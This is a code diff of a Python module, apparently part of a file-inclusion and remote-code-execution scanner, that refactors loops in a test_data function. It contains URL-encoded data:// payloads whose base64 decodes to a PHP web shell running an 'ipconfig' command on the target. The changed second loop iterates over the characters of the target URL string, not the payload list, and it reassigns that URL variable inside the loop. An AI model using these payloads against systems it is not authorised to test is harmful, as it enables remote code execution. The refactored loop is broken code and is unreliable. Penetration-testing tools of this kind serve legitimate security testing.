@@ -1,7 +1,7 @@
+"""Data payload"""
 import urllib.parse as urlparse
 from src.utils.arguments import args
 from src.configs import config
-from src.utils.stats import stats
 from src.utils.encodings import encode
 from src.httpreqs.request import prepareRequest
 from src.httpreqs.request import REQUEST
@@ -24,8 +24,8 @@ def test_data(url, post):
             "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig"
         )
 
-        for i in range(len(tests)):
-            u, reqHeaders, postTest = prepareRequest(args.param, tests[i], url, post)
+        for _, test in enumerate(tests):
+            u, reqHeaders, postTest = prepareRequest(args.param, test, url, post)
             _, br = REQUEST(u, reqHeaders, postTest, config.proxies, "RCE", "DATA")
             if not br:
                 return
@@ -45,10 +45,10 @@ def test_data(url, post):
             "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K"
         )
 
-        for i in range(len(urls)):
+        for _, url_enum in enumerate(url):
             url, reqHeaders, postTest = prepareRequest(args.param, test, url, post)
             _, br = REQUEST(
-                url + encode(urls[i]),
+                url + encode(url_enum),
                 reqHeaders,
                 postTest,
                 config.proxies,
